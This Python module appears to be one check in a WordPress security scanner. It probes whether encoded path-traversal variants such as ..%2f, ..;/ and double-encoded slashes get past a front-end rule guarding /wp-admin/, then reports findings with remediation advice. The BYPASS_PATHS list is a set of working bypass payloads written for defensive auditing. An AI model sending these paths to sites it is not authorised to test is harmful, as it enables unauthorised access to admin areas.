"""Path-normalisation bypass probe (aggressive).

Tests whether a WAF / front-end ACL can be bypassed via encoded path traversal:
  - `..%2f` (URL-encoded /)
  - `..;/` (Tomcat path-parameter trick)
  - `%5c` (backslash, treated as / by some servers)
  - `..%252f` (double-URL-encoded /)
  - `..%c0%af` (overlong UTF-8 /)

Baseline /wp-admin/ + try each bypass variant. If a bypass returns a DIFFERENT
(non-403) response than the baseline, the ACL is bypassable.
"""
from __future__ import annotations

from ..http import Client
from ..models import Finding

# Variants that "look like" a path to /wp-admin/admin.php but exploit normalisation differences
BYPASS_PATHS = (
    "/wp-admin/admin.php",                          # baseline
    "/wp-admin/..%2f..%2fwp-admin/admin.php",
    "/wp-admin/..;/admin.php",
    "/wp-admin/%2e%2e/wp-admin/admin.php",
    "/wp-admin/..%252fadmin.php",
    "/wp-admin//admin.php",
    "/wp-admin/./admin.php",
    "/wp-admin/admin.php%20",                       # trailing space (some WAFs miss)
    "/wp-admin/admin.php#",
    "/wp-admin/admin.php?ignored=1",
    "/%2e%2e/wp-admin/admin.php",
    "/wp-admin/admin.php/.",
)


async def check(client: Client, ctx: dict) -> list[Finding]:
    findings: list[Finding] = []
    step = ctx.get("step") or (lambda _s: None)

    if not ctx.get("aggressive"):
        findings.append(
            Finding(
                severity="info",
                title="Path-normalisation bypass probe skipped (requires --aggressive)",
                evidence="This sends ../, ..%2f, ..;/, %5c-style payloads against /wp-admin/.",
                remediation="No action.",
                url=ctx["target"],
            )
        )
        return findings

    step("baselining /wp-admin/admin.php (should be 302 to login)...")
    baseline = await client.get("/wp-admin/admin.php")
    if baseline is None:
        findings.append(
            Finding(
                severity="info",
                title="Path-bypass probe skipped — no baseline response",
                evidence="GET /wp-admin/admin.php returned None.",
                remediation="No action.",
                url=ctx["target"],
            )
        )
        return findings
    base_status = baseline.status_code
    base_len = len(baseline.content or b"")

    # If the baseline is ALREADY 200 (admin is open to the world), nothing to bypass
    if base_status == 200 and base_len > 1000:
        findings.append(
            Finding(
                severity="critical",
                title="/wp-admin/admin.php is publicly reachable without auth",
                evidence=f"GET /wp-admin/admin.php -> HTTP 200 with {base_len} bytes (no login redirect).",
                remediation="Restrict /wp-admin/ to admin IPs at the web server / WAF.",
                url=client.url("/wp-admin/admin.php"),
            )
        )
        return findings

    bypasses: list[tuple[str, int, int]] = []
    for path in BYPASS_PATHS[1:]:  # skip the baseline
        step(f"probing path-bypass {path}...")
        r = await client.get(path)
        if r is None:
            continue
        # Bypass = response that looks DIFFERENT from the baseline (status delta OR big body delta)
        body_len = len(r.content or b"")
        if r.status_code != base_status and r.status_code not in (404, 400):
            bypasses.append((path, r.status_code, body_len))
        elif r.status_code == 200 and abs(body_len - base_len) > 1000:
            bypasses.append((path, r.status_code, body_len))

    if not bypasses:
        findings.append(
            Finding(
                severity="info",
                title="No path-normalisation bypasses found",
                evidence=f"Baseline /wp-admin/admin.php = HTTP {base_status}; all {len(BYPASS_PATHS)-1} encoded variants matched the baseline.",
                remediation="No action — your front-end ACL normalises paths consistently.",
                url=ctx["target"],
            )
        )
        return findings

    for path, status, body_len in bypasses:
        findings.append(
            Finding(
                severity="high",
                title=f"Path-normalisation bypass candidate: {path[:80]}",
                evidence=(
                    f"Baseline GET /wp-admin/admin.php -> HTTP {base_status} ({base_len} bytes)\n"
                    f"Bypass    GET {path} -> HTTP {status} ({body_len} bytes)\n\n"
                    "The front-end (Nginx/Apache/Cloudflare) normalises the path differently than the "
                    "backend (PHP-FPM/WordPress). Attacker can hit /wp-admin/ resources by bouncing through "
                    "a path that the ACL doesn't match but the backend serves."
                ),
                remediation=(
                    "Configure your front-end to normalise paths BEFORE applying the ACL:\n"
                    "  - Nginx: `merge_slashes on; absolute_redirect off;`\n"
                    "  - Apache: enable `mod_rewrite` with `[B,QSA,NE]` flags on protection rules\n"
                    "  - Cloudflare: use Transform Rules to canonicalise URI before matching\n"
                    "Or apply the ACL at the BACKEND (WordPress hooks) rather than the front-end."
                ),
                url=client.url(path),
            )
        )
    return findings
